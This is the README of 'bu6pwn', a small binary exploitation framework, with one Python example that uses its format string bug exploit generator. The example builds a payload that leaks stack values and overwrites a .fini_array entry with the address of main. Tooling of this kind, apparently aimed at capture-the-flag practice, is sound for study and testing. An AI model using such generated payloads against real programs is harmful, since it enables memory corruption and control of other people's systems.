# bu6pwn
## Pwning Framework

### Functionalities
- Format String Bug Exploit Generator
    + Example
    ```python
    #!/usr/bin/env python3
    from bu6pwn.FSB import FSB

    addr_main       = 0x0804849b
    addr_fini_arr   = 0x080496dc

    exploit = b'%2$08x%264$08x'

    fsb = FSB(header=len(exploit), count=len(exploit), size=2, debug=True)

    fsb.set_adrval(addr_fini_arr, addr_main)
    fsb.auto_write(index=7)
    exploit += fsb.get()
    print(exploit.decode())
    ```
